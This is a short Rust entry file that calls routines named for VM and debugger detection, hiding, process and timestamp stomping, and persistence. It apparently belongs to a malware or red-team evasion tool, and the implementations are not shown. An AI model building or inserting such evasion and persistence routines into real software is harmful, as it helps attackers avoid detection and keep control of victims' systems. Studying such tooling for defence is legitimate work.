mod module;
use module::{check_debugger, check_vm, hide, persistence, process_stomp, time_stomp};

fn main() {
    
    check_vm();
    check_debugger();
    hide();
    process_stomp();
    time_stomp(); 
    persistence();

    std::thread::sleep(std::time::Duration::from_secs(10));
    std::process::exit(0);
}
